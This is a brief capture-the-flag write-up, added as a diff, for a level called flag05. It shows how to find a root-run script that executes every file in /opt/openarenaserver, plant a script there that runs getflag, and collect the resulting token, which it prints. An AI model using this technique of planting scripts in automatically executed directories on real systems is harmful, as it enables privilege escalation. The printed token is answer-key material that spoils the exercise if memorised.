@@ -1,0 +1,29 @@
+List home file
+	-> nothing
+
+Command to find file owned by flag05
+	find / -user flag05 1>/tmp/list
+	/*
+	/usr/sbin/openarenaserver
+	/rofs/usr/sbin/openarenaserver
+	*/
+
+We check the file :
+	/*
+	#!/bin/sh
+
+	for i in /opt/openarenaserver/* ; do
+	        (ulimit -t 5; bash -x "$i")
+	        rm -f "$i"
+	done
+	*/
+
+We create a file in /opt/openarenaserver/
+	/*
+	#!/bin/bash
+	/bin/getflag > /tmp/flag05
+	*/
+
+When we try to login "su flag05", the script is launched and we get the flag in /tmp/flag05
+	->Check flag.Here is your token : viuaaale9huek52boumoomioc
+
